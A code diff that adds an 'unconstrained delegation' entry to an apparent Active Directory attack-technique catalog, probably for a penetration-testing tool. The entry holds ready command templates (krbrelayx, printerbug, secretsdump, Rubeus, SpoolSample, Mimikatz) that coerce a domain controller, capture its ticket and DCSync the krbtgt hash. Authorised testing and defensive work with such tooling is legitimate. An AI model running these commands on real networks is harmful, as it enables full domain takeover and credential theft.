@@ -323,6 +323,34 @@ _CATALOG: dict[str, AbuseSpec] = {
         win_template=("Rubeus.exe s4u /user:'{source_sam}' /rc4:<HASH> "
                       "/impersonateuser:Administrator /msdsspn:'{target_spn}' /ptt"),
     ),
+    "TrustedForDelegation": AbuseSpec(
+        title="Unconstrained delegation (capture a DC TGT)",
+        summary="Own {source} (unconstrained delegation), coerce {dc} to authenticate to it, "
+                "capture its TGT, then DCSync — full domain compromise.",
+        tool="krbrelayx + printerbug / Rubeus",
+        kb_seeds="unconstrained delegation printerbug petitpotam TGT capture Rubeus monitor "
+                 "krbrelayx DCSync coerce domain controller",
+        # LINUX (from Kali): listen on the OWNED unconstrained host, coerce the DC to auth to it,
+        # capture the DC's TGT, then DCSync. The first runnable line (krbrelayx) captures domain
+        # credentials, so it trips the danger heuristic — asserted by the catalog oracle.
+        template=("# on the OWNED unconstrained host {source}: listen for the coerced DC's TGT\n"
+                  "krbrelayx.py -t ldap://{dc} --no-dump\n"
+                  "# in another shell, coerce {dc} to authenticate back to {source}:\n"
+                  "python3 printerbug.py '{domain}/<USER>:<PASSWORD>@{dc}' {source}\n"
+                  "# the captured DC TGT -> DCSync krbtgt (full domain compromise):\n"
+                  "KRB5CCNAME='{dc}.ccache' impacket-secretsdump -k -no-pass -just-dc "
+                  "'{domain}/@{dc}'"),
+        needs_target="domain",
+        destructive=True,
+        # NATIVE WINDOWS (CRTP): Rubeus monitors for tickets ON the owned host, SpoolSample coerces
+        # the DC, Rubeus PTTs the captured TGT, then mimikatz DCSyncs krbtgt. `Rubeus monitor`
+        # harvests Kerberos tickets, so it too trips the heuristic (the rubeus verb map).
+        win_template=("Rubeus.exe monitor /interval:1 /nowrap\n"
+                      "SpoolSample.exe {dc} {source}\n"
+                      "Rubeus.exe ptt /ticket:<base64-DC-TGT>\n"
+                      "Invoke-Mimikatz -Command '\"lsadump::dcsync /domain:{domain} "
+                      "/user:{domain}\\krbtgt\"'"),
+    ),
     "HasSIDHistory": AbuseSpec(
         title="SID history",
         summary="{source} carries {target}'s SID in its history — it already holds that access.",
